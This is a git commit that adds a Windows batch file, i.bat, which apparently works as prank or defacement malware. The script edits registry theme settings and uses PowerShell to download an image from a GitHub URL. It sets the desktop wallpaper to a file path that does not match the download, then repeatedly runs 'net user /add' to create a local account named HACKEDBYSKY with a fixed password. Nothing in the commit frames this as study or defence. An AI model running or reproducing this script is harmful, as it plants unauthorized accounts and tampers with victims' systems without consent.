11b5c8728dec5d4bc22588878008f871a952cbc1
ngdpforreal <168348967+ngdpforreal@users.noreply.github.com>
2024-09-16 16:38:39 +0700

    Add files via upload

---
+++ i.bat
@@ -0,0 +1,13 @@
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v "ColorPrevalence" /t REG_DWORD /d 1 /f
+
+powershell Invoke-WebRequest -OutFile C:\index.png -Uri https://raw.githubusercontent.com/ngdpforreal/vd/main/ERROR.png
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\ERROR.png" /f
+net user /add HACKEDBYSKY hsjfhddddd
+net user /add HACKEDBYSKY hsjfhddddd
+net user /add HACKEDBYSKY hsjfhddddd
+net user /add HACKEDBYSKY hsjfhddddd
+net user /add HACKEDBYSKY hsjfhddddd
+net user /add HACKEDBYSKY hsjfhddddd
+net user /add HACKEDBYSKY hsjfhddddd
+net user /add HACKEDBYSKY hsjfhddddd
+net user /add HACKEDBYSKY hsjfhddddd
